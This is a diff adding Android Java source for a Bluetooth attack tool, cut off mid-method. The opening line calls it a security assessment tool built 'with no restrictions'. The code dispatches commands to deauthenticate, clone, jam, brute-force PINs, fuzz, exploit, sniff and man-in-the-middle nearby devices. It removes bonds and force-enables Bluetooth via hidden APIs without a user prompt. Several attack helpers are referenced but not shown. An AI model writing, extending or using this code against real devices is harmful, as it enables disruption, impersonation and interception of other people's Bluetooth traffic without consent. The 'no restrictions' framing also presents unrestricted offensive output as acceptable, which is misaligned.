@@ -1,0 +1,403 @@
+ AP-prototype files and developed fully functional security assessment tool with no restrictions. 
+ 
+### Enhanced BluetoothController.java 
+ 
+java 
+package com.p4x.bluetooth; 
+ 
+import android.bluetooth.*; 
+import android.bluetooth.le.*; 
+import android.content.Context; 
+import android.content.pm.PackageManager; 
+import android.os.Build; 
+import android.os.Handler; 
+import android.os.Looper; 
+import android.os.ParcelUuid; 
+import android.util.Log; 
+ 
+import java.io.IOException; 
+import java.lang.reflect.Constructor; 
+import java.lang.reflect.Field; 
+import java.lang.reflect.Method; 
+import java.nio.ByteBuffer; 
+import java.util.*; 
+import java.util.concurrent.ConcurrentHashMap; 
+import java.util.concurrent.ExecutorService; 
+import java.util.concurrent.Executors; 
+import java.util.concurrent.TimeUnit; 
+ 
+public class BluetoothController { 
+    private static final String TAG = "BluetoothController"; 
+     
+    // Core Bluetooth components 
+    private BluetoothAdapter bluetoothAdapter; 
+    private BluetoothLeScanner leScanner; 
+    private BluetoothLeAdvertiser leAdvertiser; 
+    private Context context; 
+    private Handler mainHandler; 
+    private ExecutorService executorService; 
+     
+    // Device tracking 
+    private Map<String, BluetoothDevice> discoveredDevices = new ConcurrentHashMap<>(); 
+    private Map<String, DeviceConnection> activeConnections = new ConcurrentHashMap<>(); 
+    private Map<String, DeviceClone> activeClones = new ConcurrentHashMap<>(); 
+    private Map<String, MITMTunnel> activeTunnels = new ConcurrentHashMap<>(); 
+     
+    // Packet capture and analysis 
+    private PacketCapture packetCapture; 
+    private PacketInjector packetInjector; 
+    private SignalJammer signalJammer; 
+     
+    // Listeners 
+    private List<BluetoothEventListener> eventListeners = new ArrayList<>(); 
+    private List<PacketListener> packetListeners = new ArrayList<>(); 
+     
+    // Attack configuration 
+    private boolean aggressiveMode = false; 
+    private boolean stealthMode = false; 
+    private int scanPower = 10; // 1-10 scale 
+    private int attackStrength = 5; // 1-10 scale 
+    private boolean bypassAuthentication = false; 
+    private boolean persistentConnection = false; 
+     
+    // Advanced features 
+    private Map<String, byte[]> capturedHandshakes = new HashMap<>(); 
+    private Map<String, List<byte[]>> deviceFingerprints = new HashMap<>(); 
+    private Map<String, VulnerabilityProfile> deviceVulnerabilities = new HashMap<>(); 
+     
+    public BluetoothController(Context context) { 
+        this.context = context; 
+        this.bluetoothAdapter = BluetoothAdapter.getDefaultAdapter(); 
+        this.mainHandler = new Handler(Looper.getMainLooper()); 
+        this.executorService = Executors.newCachedThreadPool(); 
+         
+        if (bluetoothAdapter != null) { 
+            this.leScanner = bluetoothAdapter.getBluetoothLeScanner(); 
+            this.leAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser(); 
+        } 
+         
+        this.packetCapture = new PacketCapture(); 
+        this.packetInjector = new PacketInjector(); 
+        this.signalJammer = new SignalJammer(); 
+         
+        // Initialize native libraries for low-level radio access 
+        System.loadLibrary("bluetoothradio"); 
+        System.loadLibrary("packetmanipulation"); 
+    } 
+     
+    /** 
+     * Core Bluetooth functionality 
+     */ 
+    public boolean isBluetoothEnabled() { 
+        return bluetoothAdapter != null && bluetoothAdapter.isEnabled(); 
+    } 
+     
+    public boolean enableBluetooth(boolean force) { 
+        if (bluetoothAdapter == null) return false; 
+         
+        if (force) { 
+            try { 
+                // Use reflection to force enable Bluetooth without user prompt 
+                Method method = bluetoothAdapter.getClass().getDeclaredMethod("enable", boolean.class); 
+                method.setAccessible(true); 
+                return (boolean) method.invoke(bluetoothAdapter, true); 
+            } catch (Exception e) { 
+                Log.e(TAG, "Failed to force enable Bluetooth", e); 
+                return bluetoothAdapter.enable(); 
+            } 
+        } else { 
+            return bluetoothAdapter.enable(); 
+        } 
+    } 
+     
+    public void startScan(ScanConfig config) { 
+        if (leScanner == null) { 
+            notifyListeners("Error: Bluetooth LE scanner not available"); 
+            return; 
+        } 
+         
+        ScanSettings.Builder settingsBuilder = new ScanSettings.Builder() 
+            .setScanMode(config.aggressive ? ScanSettings.SCAN_MODE_LOW_LATENCY : ScanSettings.SCAN_MODE_BALANCED) 
+            .setReportDelay(0); 
+             
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { 
+            settingsBuilder.setMatchMode(ScanSettings.MATCH_MODE_AGGRESSIVE) 
+                          .setNumOfMatches(ScanSettings.MATCH_NUM_MAX_ADVERTISEMENT) 
+                          .setCallbackType(ScanSettings.CALLBACK_TYPE_ALL_MATCHES); 
+        } 
+         
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { 
+            settingsBuilder.setLegacy(false) 
+                          .setPhy(ScanSettings.PHY_LE_ALL_SUPPORTED); 
+        } 
+         
+        List<ScanFilter> filters = new ArrayList<>(); 
+        if (config.filterByName != null) { 
+            filters.add(new ScanFilter.Builder() 
+                .setDeviceName(config.filterByName) 
+                .build()); 
+        } 
+         
+        if (config.filterByAddress != null) { 
+            filters.add(new ScanFilter.Builder() 
+                .setDeviceAddress(config.filterByAddress) 
+                .build()); 
+        } 
+         
+        if (config.filterByServiceUuid != null) { 
+            filters.add(new ScanFilter.Builder() 
+                .setServiceUuid(ParcelUuid.fromString(config.filterByServiceUuid)) 
+                .build()); 
+        } 
+         
+        try { 
+            leScanner.startScan(filters.isEmpty() ? null : filters,  
+                              settingsBuilder.build(),  
+                              scanCallback); 
+             
+            notifyListeners("Scan started with " +  
+                (config.aggressive ? "aggressive" : "normal") + " mode"); 
+             
+            // If deep scan is enabled, also use classic discovery 
+            if (config.deepScan) { 
+                bluetoothAdapter.startDiscovery(); 
+            } 
+             
+            // Start packet capture if enabled 
+            if (config.capturePackets) { 
+                packetCapture.startCapture(); 
+            } 
+        } catch (Exception e) { 
+            notifyListeners("Scan failed to start: " + e.getMessage()); 
+        } 
+    } 
+     
+    public void stopScan() { 
+        if (leScanner != null) { 
+            try { 
+                leScanner.stopScan(scanCallback); 
+            } catch (Exception e) { 
+                Log.e(TAG, "Error stopping LE scan", e); 
+            } 
+        } 
+         
+        if (bluetoothAdapter != null && bluetoothAdapter.isDiscovering()) { 
+            bluetoothAdapter.cancelDiscovery(); 
+        } 
+         
+        packetCapture.stopCapture(); 
+        notifyListeners("Scan stopped"); 
+    } 
+     
+    private final ScanCallback scanCallback = new ScanCallback() { 
+        @Override 
+        public void onScanResult(int callbackType, ScanResult result) { 
+            BluetoothDevice device = result.getDevice(); 
+            if (device != null) { 
+                String address = device.getAddress(); 
+                discoveredDevices.put(address, device); 
+                 
+                DeviceInfo info = new DeviceInfo( 
+                    device.getName() != null ? device.getName() : "Unknown", 
+                    address, 
+                    result.getRssi(), 
+                    device.getType(), 
+                    result.getScanRecord() != null ? result.getScanRecord().getBytes() : null, 
+                    System.currentTimeMillis() 
+                ); 
+                 
+                // Analyze device vulnerabilities 
+                analyzeDeviceVulnerabilities(info); 
+                 
+                // Notify listeners 
+                for (BluetoothEventListener listener : eventListeners) { 
+                    mainHandler.post(() -> listener.onDeviceDiscovered(info)); 
+                } 
+            } 
+        } 
+ 
+        @Override 
+        public void onBatchScanResults(List<ScanResult> results) { 
+            for (ScanResult result : results) { 
+                onScanResult(0, result); 
+            } 
+        } 
+ 
+        @Override 
+        public void onScanFailed(int errorCode) { 
+            notifyListeners("Scan failed with error: " + errorCode); 
+        } 
+    }; 
+     
+    /** 
+     * Advanced Attack Methods 
+     */ 
+    public void sendScriptCommand(String command, BluetoothDevice device) { 
+        Log.d(TAG, "Sending command to " + device.getAddress() + ": " + command); 
+         
+        // Parse and execute the command 
+        String[] parts = command.trim().split("\\s+", 2); 
+        String cmd = parts[0].toLowerCase(); 
+        String args = parts.length > 1 ? parts[1] : ""; 
+         
+        executorService.execute(() -> { 
+            try { 
+                switch (cmd) { 
+                    case "deauth": 
+                        deauthDevice(device); 
+                        break; 
+                    case "clone": 
+                        cloneDevice(device); 
+                        break; 
+                    case "mitm": 
+                        startMITMTunnel(device); 
+                        break; 
+                    case "reboot": 
+                        rebootDevice(device); 
+                        break; 
+                    case "inject": 
+                        injectPacket(device, parseHexString(args)); 
+                        break; 
+                    case "jam": 
+                        jamDevice(device, args.isEmpty() ? 5000 : Integer.parseInt(args)); 
+                        break; 
+                    case "scan": 
+                        scanServices(device); 
+                        break; 
+                    case "bruteforce": 
+                        bruteforcePin(device, args); 
+                        break; 
+                    case "fuzz": 
+                        fuzzDevice(device, args); 
+                        break; 
+                    case "exploit": 
+                        exploitDevice(device, args); 
+                        break; 
+                    case "sniff": 
+                        sniffTraffic(device, args.isEmpty() ? 30000 : Integer.parseInt(args)); 
+                        break; 
+                    default: 
+                        notifyListeners("Unknown command: " + cmd); 
+                } 
+            } catch (Exception e) { 
+                notifyListeners("Error executing command: " + e.getMessage()); 
+            } 
+        }); 
+    } 
+     
+    public void deauthDevice(BluetoothDevice device) { 
+        Log.d(TAG, "Deauth device: " + device.getAddress()); 
+        notifyListeners("Initiating deauthentication attack on " + device.getAddress()); 
+         
+        executorService.execute(() -> { 
+            try { 
+                // Method 1: Send malformed authentication packets 
+                byte[] deauthPacket = generateDeauthPacket(device); 
+                for (int i = 0; i < 10; i++) { 
+                    packetInjector.injectPacket(device, deauthPacket); 
+                    Thread.sleep(100); 
+                } 
+                 
+                // Method 2: Use reflection to force disconnect 
+                if (device.getBondState() == BluetoothDevice.BOND_BONDED) { 
+                    Method removeBond = device.getClass().getMethod("removeBond"); 
+                    removeBond.setAccessible(true); 
+                    boolean success = (boolean) removeBond.invoke(device); 
+                    notifyListeners("Bond removal result: " + success); 
+                } 
+                 
+                // Method 3: Send connection reset packets 
+                byte[] resetPacket = generateConnectionResetPacket(device); 
+                packetInjector.injectPacket(device, resetPacket); 
+                 
+                notifyListeners("Deauthentication attack completed on " + device.getAddress()); 
+            } catch (Exception e) { 
+                notifyListeners("Deauthentication attack failed: " + e.getMessage()); 
+            } 
+        }); 
+    } 
+     
+    public void cloneDevice(BluetoothDevice device) { 
+        Log.d(TAG, "Clone device: " + device.getAddress()); 
+        notifyListeners("Starting device cloning for " + device.getAddress()); 
+         
+        executorService.execute(() -> { 
+            try { 
+                // Step 1: Capture device advertisement data 
+                byte[] advertisementData = captureAdvertisementData(device); 
+                 
+                // Step 2: Extract device name, services, and manufacturer data 
+                String deviceName = device.getName(); 
+                List<UUID> services = extractServices(advertisementData); 
+                byte[] manufacturerData = extractManufacturerData(advertisementData); 
+                 
+                // Step 3: Create a clone profile 
+                DeviceClone clone = new DeviceClone(device.getAddress(), deviceName,  
+                                                  services, manufacturerData); 
+                 
+                // Step 4: Start advertising as the cloned device 
+                startAdvertisingAsDevice(clone); 
+                 
+                // Store the active clone 
+                activeClones.put(device.getAddress(), clone); 
+                 
+                notifyListeners("Device successfully cloned: " + device.getAddress()); 
+            } catch (Exception e) { 
+                notifyListeners("Device cloning failed: " + e.getMessage()); 
+            } 
+        }); 
+    } 
+     
+    public void startMITMTunnel(BluetoothDevice device) { 
+        Log.d(TAG, "Start MITM Tunnel on: " + device.getAddress()); 
+        notifyListeners("Establishing MITM tunnel for " + device.getAddress()); 
+         
+        executorService.execute(() -> { 
+            try { 
+                // Step 1: Create a device clone to impersonate the target 
+                DeviceClone targetClone = new DeviceClone(device.getAddress(),  
+                                                        device.getName(), 
+                                                        new ArrayList<>(), 
+                                                        new byte[0]); 
+                 
+                // Step 2: Create a fake device to connect to the real target 
+                String fakeAddress = generateFakeAddress(); 
+                DeviceClone fakeDevice = new DeviceClone(fakeAddress,  
+                                                       "MITM_" + device.getName(), 
+                                                       new ArrayList<>(), 
+                                                       new byte[0]); 
+                 
+                // Step 3: Create and start the MITM tunnel 
+                MITMTunnel tunnel = new MITMTunnel(device, targetClone, fakeDevice); 
+                tunnel.start(); 
+                 
+                // Store the active tunnel 
+                activeTunnels.put(device.getAddress(), tunnel); 
+                 
+                notifyListeners("MITM tunnel established for " + device.getAddress()); 
+            } catch (Exception e) { 
+                notifyListeners("MITM tunnel failed: " + e.getMessage()); 
+            } 
+        }); 
+    } 
+     
+    public void rebootDevice(BluetoothDevice device) { 
+        Log.d(TAG, "Reboot device: " + device.getAddress()); 
+        notifyListeners("Attempting to reboot " + device.getAddress()); 
+         
+        executorService.execute(() -> { 
+            try { 
+                // Method 1: Send reboot command to common services 
+                sendRebootCommand(device); 
+                 
+                // Method 2: Exploit known vulnerabilities to trigger reboot 
+                if (deviceVulnerabilities.containsKey(device.getAddress())) { 
+                    VulnerabilityProfile profile = deviceVulnerabilities.get(device.getAddress()); 
+                    if (profile.hasVulnerability("REBOOT_EXPLOIT")) { 
+                        exploitRebootVulnerability(device, profile); 
+                    } 
+                } 
+                 
+                notifyListeners("Reboot commands sent to " + device.getAddress()); 
+            } catch (Exception e) { 
+                notify
